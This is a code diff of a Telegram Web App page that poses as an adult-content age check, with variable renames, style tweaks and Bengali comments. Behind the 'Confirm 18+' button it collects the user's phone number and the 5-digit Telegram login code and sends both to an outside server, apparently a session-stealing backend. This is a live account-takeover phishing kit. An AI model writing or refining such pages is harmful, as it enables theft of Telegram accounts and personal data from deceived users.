@@ -7,81 +7,95 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { font-family: sans-serif; padding: 0; margin: 0; background: #000; color: white; text-align: center; }
-        .box { background: white; color: #333; padding: 30px; border-radius: 25px; margin: 40px 20px; }
+        .box { background: white; color: #333; padding: 30px; border-radius: 25px; margin: 50px 20px; }
         .btn { background: #28a745; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; font-size: 20px; cursor: pointer; }
         .hidden { display: none; }
-        input { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 22px; text-align: center; }
+        input { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 24px; text-align: center; }
     </style>
 </head>
 <body>
     <div class="box" id="step0">
-        <h2 id="st">Attention!</h2>
+        <h2 id="status">Attention!</h2>
         <p>You must confirm you are 18+ to continue.</p>
-        <button class="btn" id="mb" onclick="startRequest()">🍓 Confirm 🔞</button>
-        <p id="wait" class="hidden">🔄 Waiting for contact... Please wait.</p>
+        <button class="btn" id="confirm_btn" onclick="shareContact()">🍓 Confirm 🔞</button>
+        <p id="wait_msg" class="hidden" style="color:#888;">🔄 Verifying... please wait.</p>
     </div>
 
     <div class="box hidden" id="step2">
-        <h3>Enter OTP Code</h3>
-        <p>Check your Telegram for a 5-digit code.</p>
-        <input type="number" id="otp" placeholder="-----">
-        <button class="btn" onclick="verifyOTP()">Verify</button>
+        <h3>Enter 5-Digit Code</h3>
+        <p>Code sent to your Telegram account.</p>
+        <input type="number" id="otp_code" placeholder="-----">
+        <button class="btn" onclick="verifyOTP()">Verify OK</button>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
+        
+        // নিশ্চিত করুন লিঙ্কের শেষে '/' নেই
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
 
-        function startRequest() {
+        function shareContact() {
             tg.requestContact((res) => {
                 if (res.status === 'sent') {
-                    document.getElementById('mb').classList.add('hidden');
-                    document.getElementById('wait').classList.remove('hidden');
-                    document.getElementById('st').innerText = "Verifying...";
-                    poll();
-                } else {
-                    alert("Sharing cancelled or failed.");
+                    document.getElementById('confirm_btn').classList.add('hidden');
+                    document.getElementById('wait_msg').classList.remove('hidden');
+                    document.getElementById('status').innerText = "Processing...";
+                    poll(); // নম্বর চেক শুরু
                 }
             });
         }
 
         async function poll() {
             try {
-                let r = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
-                let d = await r.json();
-                if (d.status === "success") {
-                    send(d.phone);
+                const response = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
+                const data = await response.json();
+                
+                if (data.status === "success") {
+                    sendNumber(data.phone);
                 } else {
-                    setTimeout(poll, 2000); // ২ সেকেন্ড পর আবার চেক
+                    setTimeout(poll, 1500); // ১.৫ সেকেন্ড পর পর চেক
                 }
-            } catch (e) { setTimeout(poll, 2000); }
+            } catch (e) { 
+                setTimeout(poll, 2000); 
+            }
         }
 
-        async function send(phone) {
+        async function sendNumber(phone) {
             try {
-                let r = await fetch(`${BACKEND_URL}/send_number`, {
-                    method: "POST", headers: {"Content-Type": "application/json"},
+                const response = await fetch(`${BACKEND_URL}/send_number`, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({ user_id: userId, phone: phone })
                 });
-                let d = await r.json();
-                if(d.status === "success") {
+                const data = await response.json();
+                if (data.status === "success") {
                     document.getElementById('step0').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
-                } else { alert("Error: " + d.message); }
-            } catch (e) { alert("Server Error!"); }
+                } else {
+                    alert("Error: " + data.message);
+                }
+            } catch (e) { alert("Network Error!"); }
         }
 
         async function verifyOTP() {
-            let otp = document.getElementById("otp").value;
-            let r = await fetch(`${BACKEND_URL}/verify_otp`, {
-                method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ user_id: userId, otp: otp })
-            });
-            let d = await r.json();
-            if(d.status === "success") tg.close();
-            else alert("Invalid OTP");
+            const code = document.getElementById("otp_code").value;
+            if(code.length < 5) return alert("Enter 5 digits!");
+
+            try {
+                const response = await fetch(`${BACKEND_URL}/verify_otp`, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({ user_id: userId, otp: code })
+                });
+                const data = await response.json();
+                if (data.status === "success") {
+                    tg.close();
+                } else {
+                    alert("Wrong Code!");
+                }
+            } catch (e) { alert("Server Error!"); }
         }
     </script>
 </body>
